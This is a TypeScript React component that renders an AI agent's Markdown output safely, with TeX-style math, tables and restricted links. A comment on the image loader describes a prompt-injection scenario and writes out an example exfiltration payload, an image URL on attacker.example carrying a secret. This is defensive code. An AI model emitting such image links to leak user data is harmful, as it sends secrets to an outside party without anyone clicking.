// Minimal Markdown → React renderer for agent messages.
//
// Builds elements directly (never innerHTML), so model output can't inject
// markup. Covers what research chat actually uses: headings, paragraphs,
// emphasis, inline/fenced code, lists (with nesting and task boxes), quotes,
// GFM tables, rules and links. Anything else renders as plain text.
import { Fragment, type ReactNode } from "react";

type Block =
  | { t: "code"; lang: string; text: string }
  | { t: "h"; level: number; text: string }
  | { t: "p"; text: string }
  | { t: "quote"; lines: string[] }
  | { t: "list"; ordered: boolean; items: { text: string; depth: number; check?: boolean }[] }
  | { t: "table"; head: string[]; rows: string[][]; align: string[] }
  | { t: "hr" };

const LIST_RE = /^(\s*)([-*+]|\d+[.)])\s+(.*)$/;

function splitRow(line: string): string[] {
  let l = line.trim();
  if (l.startsWith("|")) l = l.slice(1);
  if (l.endsWith("|")) l = l.slice(0, -1);
  return l.split(/(?<!\\)\|/).map((c) => c.trim().replace(/\\\|/g, "|"));
}

function parse(src: string): Block[] {
  const lines = src.replace(/\r\n?/g, "\n").split("\n");
  const out: Block[] = [];
  let i = 0;
  while (i < lines.length) {
    const line = lines[i];
    if (!line.trim()) { i++; continue; }
    const fence = line.match(/^\s*(```+|~~~+)\s*([\w+-]*)/);
    if (fence) {
      const close = fence[1];
      const body: string[] = [];
      i++;
      while (i < lines.length && !lines[i].trim().startsWith(close)) body.push(lines[i++]);
      i++;
      out.push({ t: "code", lang: fence[2] || "", text: body.join("\n") });
      continue;
    }
    const h = line.match(/^(#{1,6})\s+(.*)$/);
    if (h) { out.push({ t: "h", level: h[1].length, text: h[2].replace(/\s+#+\s*$/, "") }); i++; continue; }
    if (/^\s*([-*_])(\s*\1){2,}\s*$/.test(line)) { out.push({ t: "hr" }); i++; continue; }
    if (/^\s*>/.test(line)) {
      const q: string[] = [];
      while (i < lines.length && /^\s*>/.test(lines[i])) q.push(lines[i++].replace(/^\s*>\s?/, ""));
      out.push({ t: "quote", lines: q });
      continue;
    }
    if (line.includes("|") && i + 1 < lines.length && /^\s*\|?\s*:?-{2,}:?\s*(\|\s*:?-{2,}:?\s*)*\|?\s*$/.test(lines[i + 1])) {
      const head = splitRow(line);
      const align = splitRow(lines[i + 1]).map((c) =>
        c.startsWith(":") && c.endsWith(":") ? "center" : c.endsWith(":") ? "right" : "left");
      i += 2;
      const rows: string[][] = [];
      while (i < lines.length && lines[i].includes("|") && lines[i].trim()) rows.push(splitRow(lines[i++]));
      out.push({ t: "table", head, rows, align });
      continue;
    }
    const lm = line.match(LIST_RE);
    if (lm) {
      const ordered = /\d/.test(lm[2]);
      const items: { text: string; depth: number; check?: boolean }[] = [];
      while (i < lines.length) {
        const m = lines[i].match(LIST_RE);
        if (m) {
          let text = m[3];
          let check: boolean | undefined;
          const cb = text.match(/^\[([ xX])\]\s+(.*)$/);
          if (cb) { check = cb[1] !== " "; text = cb[2]; }
          items.push({ text, depth: Math.min(3, Math.floor(m[1].replace(/\t/g, "  ").length / 2)), check });
          i++;
        } else if (lines[i].trim() && /^\s{2,}/.test(lines[i]) && items.length) {
          items[items.length - 1].text += " " + lines[i].trim();   // wrapped continuation
          i++;
        } else break;
      }
      out.push({ t: "list", ordered, items });
      continue;
    }
    const para: string[] = [];
    while (i < lines.length && lines[i].trim() && !/^\s*(```|~~~|#{1,6}\s|>)/.test(lines[i])
           && !LIST_RE.test(lines[i])) {
      para.push(lines[i++]);
    }
    if (!para.length) { para.push(lines[i++]); }
    out.push({ t: "p", text: para.join("\n") });
  }
  return out;
}

// Greek letters and operators that actually turn up in research prose. Without
// these, `$\mu$M` reached the reader as a literal backslash-mu.
const TEX_SYMBOLS: Record<string, string> = {
  alpha: "α", beta: "β", gamma: "γ", delta: "δ", epsilon: "ε", zeta: "ζ",
  eta: "η", theta: "θ", iota: "ι", kappa: "κ", lambda: "λ", mu: "µ", nu: "ν",
  xi: "ξ", pi: "π", rho: "ρ", sigma: "σ", tau: "τ", upsilon: "υ", phi: "φ",
  chi: "χ", psi: "ψ", omega: "ω",
  Gamma: "Γ", Delta: "Δ", Theta: "Θ", Lambda: "Λ", Xi: "Ξ", Pi: "Π",
  Sigma: "Σ", Phi: "Φ", Psi: "Ψ", Omega: "Ω",
  pm: "±", mp: "∓", times: "×", cdot: "·", div: "÷", approx: "≈", sim: "∼",
  simeq: "≃", equiv: "≡", neq: "≠", leq: "≤", geq: "≥", ll: "≪", gg: "≫",
  infty: "∞", propto: "∝", rightarrow: "→", to: "→", leftarrow: "←",
  leftrightarrow: "↔", Rightarrow: "⇒", degree: "°", circ: "∘", prime: "′",
  sum: "Σ", prod: "Π", int: "∫", partial: "∂", nabla: "∇", sqrt: "√",
  in: "∈", notin: "∉", subset: "⊂", cup: "∪", cap: "∩", forall: "∀",
  exists: "∃", angstrom: "Å", AA: "Å", ldots: "…", dots: "…", quad: " ",
};

/** Render a TeX-ish fragment: sub/superscripts, Greek, common operators.
 *
 *  Not a LaTeX engine — it covers what research writing uses inline (K_d,
 *  IC_{50}, R^2, \mu M, \pm, 10^{-9}). The point is that `$K_d$` reads as K
 *  with a subscript instead of as literal dollar signs with the underscore
 *  eaten by the emphasis rule. Fractions, matrices and integrals render as
 *  readable text rather than typeset maths. */
/** The {balanced} group starting at s[at], as [inner, length], or null. */
function texGroup(s: string, at: number): [string, number] | null {
  if (s[at] !== "{") return null;
  let depth = 0;
  for (let j = at; j < s.length; j++) {
    if (s[j] === "{") depth++;
    else if (s[j] === "}" && --depth === 0) return [s.slice(at + 1, j), j - at + 1];
  }
  return null;
}

function tex(src: string, keyBase: string): ReactNode[] {
  const out: ReactNode[] = [];
  let buf = "";
  let k = 0;
  const flush = () => { if (buf) { out.push(buf); buf = ""; } };
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    if (c === "\\") {
      const m = /^\\([A-Za-z]+)/.exec(src.slice(i));
      if (m) {
        const name = m[1];
        if (name === "text" || name === "mathrm" || name === "mathit" || name === "operatorname") {
          const g = /^\{([^{}]*)\}/.exec(src.slice(i + m[0].length));
          if (g) { buf += g[1]; i += m[0].length + g[0].length; continue; }
        }
        // \frac{a}{b} and \sqrt{x}: printed as "frac" plus its arguments
        // ("fracab"), the commonest construct in research text came out wrong.
        const after = i + m[0].length;
        if (name === "frac" || name === "dfrac" || name === "tfrac") {
          const num = texGroup(src, after);
          const den = num && texGroup(src, after + num[1]);
          if (num && den) {
            const wrap = (x: string) => (/^[A-Za-z0-9.]+$/.test(x.trim()) ? x.trim() : `(${x})`);
            flush();
            out.push(...tex(`${wrap(num[0])}/${wrap(den[0])}`, `${keyBase}f${k++}`));
            i = after + num[1] + den[1]; continue;
          }
        }
        if (name === "sqrt") {
          const arg = texGroup(src, after);
          if (arg) {
            const simple = /^[A-Za-z0-9.]+$/.test(arg[0].trim());
            flush();
            out.push("√", ...(simple ? [] : ["("]), ...tex(arg[0], `${keyBase}r${k++}`), ...(simple ? [] : [")"]));
            i = after + arg[1]; continue;
          }
        }
        // Own properties only: a plain index hits Object.prototype, so
        // `\toString` rendered "function toString() { [native code] }".
        const sym = Object.prototype.hasOwnProperty.call(TEX_SYMBOLS, name)
          ? TEX_SYMBOLS[name] : "";
        if (sym) { buf += sym; i += m[0].length; continue; }
        buf += name; i += m[0].length; continue;        // unknown macro: its name
      }
      i++; continue;                                    // stray backslash
    }
    if ((c === "_" || c === "^") && i + 1 < src.length) {
      const rest = src.slice(i + 1);
      const g = /^\{([^{}]*)\}/.exec(rest) || /^([A-Za-z0-9+\-.])/.exec(rest);
      if (g) {
        flush();
        const inner = tex(g[1], `${keyBase}x${k}`);
        out.push(c === "_"
          ? <sub key={`${keyBase}s${k++}`}>{inner}</sub>
          : <sup key={`${keyBase}p${k++}`}>{inner}</sup>);
        i += 1 + g[0].length;
        continue;
      }
    }
    if (c === "{" || c === "}") { i++; continue; }
    buf += c; i++;
  }
  flush();
  return out;
}

// Inline: $math$, `code`, **bold**, *em* / _em_, ~~strike~~, ![img](src),
// [text](url), bare URLs.
//
// Math comes FIRST so the emphasis rules never reach inside it: `$a_1 * b$`
// used to lose its underscore to _em_ and its asterisk to *em*.
//
// Two inline-maths forms, because a trailing letter has to be allowed in one
// case and refused in the other. `$\mu$M` and `$K_d$s` are real notation, so a
// closing `$` may be followed by a word character — but only when the content
// carries a TeX marker (\ _ ^ {). Without one, the strict form applies, which is
// what keeps prose like "costs $5 and $10" from being eaten as maths.
const INLINE = /\$\$([\s\S]+?)\$\$|(?<![\w$])\$(?!\s)((?=[^$\n]*[\\_^{])[^$\n]+?)(?<!\s)\$|(?<![\w$])\$(?!\s)([^$\n]+?)(?<!\s)\$(?![\w$])|(`+)([\s\S]*?[^`])\4(?!`)|\*\*([\s\S]+?)\*\*|__([\s\S]+?)__|~~([\s\S]+?)~~|\*([^*\s][^*]*?)\*|(?<![\w])_([^_\s][^_]*?)_(?![\w])|!\[([^\]]*)\]\(([^)\s]+)\)|\[([^\]]+)\]\(([^)\s]+)\)|(https?:\/\/[^\s<>()]+[^\s<>().,;:!?'"])/g;

function safeHref(url: string): string | null {
  return /^(https?:|mailto:|\/|#)/i.test(url) ? url : null;
}

/** Where an image in agent-written Markdown may load from — and nowhere else.
 *
 *  An <img> is fetched the moment the message renders, with no click. An
 *  external URL is therefore a zero-click exfiltration channel for an agent
 *  that picked up an injected instruction from a web page or a paper
 *  (`![](https://attacker.example/?d=<secret>)`), and a same-origin `/api/…`
 *  path is a request to this app (one of them opens a native folder dialog).
 *  So images load only from the local-file endpoint — absolute paths routed
 *  through it, relative ones resolved against `base`, the document's own folder
 *  (empty for chat messages, where a relative path has nothing to resolve
 *  against) — or from an inline `data:image/…` (no request at all). Anything
 *  else returns null and is offered as a link the researcher can choose to
 *  open. */
function imgSrc(src: string, base: string): string | null {
  const s = (src || "").trim();
  if (/^data:image\/(png|jpe?g|gif|webp|bmp|svg\+xml)[;,]/i.test(s)) return s;
  if (/^[a-z][a-z0-9+.-]*:/i.test(s) || s.startsWith("//")) return null;  // any scheme, or protocol-relative
  if (s.startsWith("/")) return "/api/files/view/" + encodeURIComponent(s);
  if (!base) return null;                      // nothing to resolve against
  const abs = base.replace(/\/+$/, "") + "/" + s.replace(/^\.?\//, "");
  return "/api/files/view/" + encodeURIComponent(abs);
}

export function inline(text: string, keyBase = "i", base = ""): ReactNode[] {
  const out: ReactNode[] = [];
  let last = 0;
  let k = 0;
  const pushText = (t: string) => {
    // keep single newlines inside a paragraph as line breaks
    const parts = t.split("\n");
    parts.forEach((p, j) => {
      if (j) out.push(<br key={`${keyBase}b${k++}`} />);
      if (p) out.push(p);
    });
  };
  for (const m of text.matchAll(INLINE)) {
    const idx = m.index ?? 0;
    if (idx > last) pushText(text.slice(last, idx));
    const key = `${keyBase}-${k++}`;
    const mathInline = m[2] !== undefined ? m[2] : m[3];
    if (m[1] !== undefined) {
      out.push(<span key={key} className="md-math block">{tex(m[1], key)}</span>);
    } else if (mathInline !== undefined) {
      out.push(<span key={key} className="md-math">{tex(mathInline, key)}</span>);
    } else if (m[4]) out.push(<code key={key} className="md-code">{m[5]}</code>);
    else if (m[6] || m[7]) out.push(<strong key={key}>{inline(m[6] || m[7], key, base)}</strong>);
    else if (m[8]) out.push(<del key={key}>{inline(m[8], key, base)}</del>);
    else if (m[9] || m[10]) out.push(<em key={key}>{inline(m[9] || m[10], key, base)}</em>);
    else if (m[12] !== undefined) {
      // An image. A figure an agent embedded in a report is part of the result,
      // so render it when the source is one we can serve; otherwise name the
      // file rather than showing a broken link.
      const src = imgSrc(m[12], base);
      // Not loadable here (e.g. an external URL): never fetch it unasked — link
      // it, so opening it is the researcher's choice.
      const link = src ? null : safeHref(m[12]);
      out.push(src
        ? <img key={key} className="md-img" src={src} alt={m[11] || ""} loading="lazy" />
        : link && !link.startsWith("/") && !link.startsWith("#")
          ? <a key={key} className="md-img-missing" href={link} target="_blank" rel="noreferrer"
               title={link}>🖼 {m[11] || "image"} ↗</a>
          : <span key={key} className="md-img-missing" title={m[12]}>
              🖼 {m[11] || m[12]}</span>);
    } else if (m[13]) {
      const href = safeHref(m[14]);
      out.push(href
        ? <a key={key} href={href} target="_blank" rel="noreferrer">{inline(m[13], key, base)}</a>
        : <span key={key}>{m[13]}</span>);
    } else if (m[15]) {
      out.push(<a key={key} href={m[15]} target="_blank" rel="noreferrer">{m[15]}</a>);
    }
    last = idx + m[0].length;
  }
  if (last < text.length) pushText(text.slice(last));
  return out;
}

function List({ items, ordered, base = "" }: { items: { text: string; depth: number; check?: boolean }[]; ordered: boolean; base?: string }) {
  // Flat items with depth → nested lists.
  type Node = { text: string; check?: boolean; kids: Node[] };
  const root: Node[] = [];
  const stack: { depth: number; kids: Node[] }[] = [{ depth: -1, kids: root }];
  for (const it of items) {
    while (stack.length > 1 && stack[stack.length - 1].depth >= it.depth) stack.pop();
    const node: Node = { text: it.text, check: it.check, kids: [] };
    stack[stack.length - 1].kids.push(node);
    stack.push({ depth: it.depth, kids: node.kids });
  }
  const render = (nodes: Node[], top: boolean, key: string): ReactNode => {
    const Tag = ordered && top ? "ol" : "ul";
    return (
      <Tag key={key}>
        {nodes.map((n, i) => (
          <li key={i} className={n.check !== undefined ? "md-task" : undefined}>
            {n.check !== undefined && <span className={"md-check" + (n.check ? " on" : "")}>{n.check ? "✓" : ""}</span>}
            {inline(n.text, `${key}-${i}`, base)}
            {n.kids.length > 0 && render(n.kids, false, `${key}-${i}k`)}
          </li>
        ))}
      </Tag>
    );
  };
  return <>{render(root, true, "l")}</>;
}

export function Markdown({ text, className, imgBase }:
                         { text: string; className?: string; imgBase?: string }) {
  const blocks = parse(text || "");
  const base = imgBase || "";
  return (
    <div className={"md " + (className || "")}>
      {blocks.map((b, i) => {
        switch (b.t) {
          case "code":
            return <CodeBlock key={i} lang={b.lang} text={b.text} />;
          case "h": {
            const H = (`h${Math.min(6, b.level + 1)}`) as any;   // h1 in chat is too loud
            return <H key={i}>{inline(b.text, `h${i}`, base)}</H>;
          }
          case "p":
            return <p key={i}>{inline(b.text, `p${i}`, base)}</p>;
          case "quote":
            return <blockquote key={i}><Markdown text={b.lines.join("\n")} imgBase={base} /></blockquote>;
          case "list":
            return <List key={i} items={b.items} ordered={b.ordered} base={base} />;
          case "hr":
            return <hr key={i} />;
          case "table":
            return (
              <div key={i} className="md-table-wrap">
                <table className="md-table">
                  <thead><tr>{b.head.map((c, j) => <th key={j} style={{ textAlign: b.align[j] as any }}>{inline(c, `t${i}h${j}`, base)}</th>)}</tr></thead>
                  <tbody>
                    {b.rows.map((r, ri) => (
                      <tr key={ri}>{b.head.map((_, j) => <td key={j} style={{ textAlign: b.align[j] as any }}>{inline(r[j] || "", `t${i}r${ri}c${j}`, base)}</td>)}</tr>
                    ))}
                  </tbody>
                </table>
              </div>
            );
        }
        return <Fragment key={i} />;
      })}
    </div>
  );
}

function CodeBlock({ lang, text }: { lang: string; text: string }) {
  const copy = () => { try { navigator.clipboard.writeText(text); } catch { /* ignore */ } };
  return (
    <div className="md-pre">
      <div className="md-pre-bar">
        <span>{lang || "text"}</span>
        <button onClick={copy} title="Copy">Copy</button>
      </div>
      <pre><code>{text}</code></pre>
    </div>
  );
}
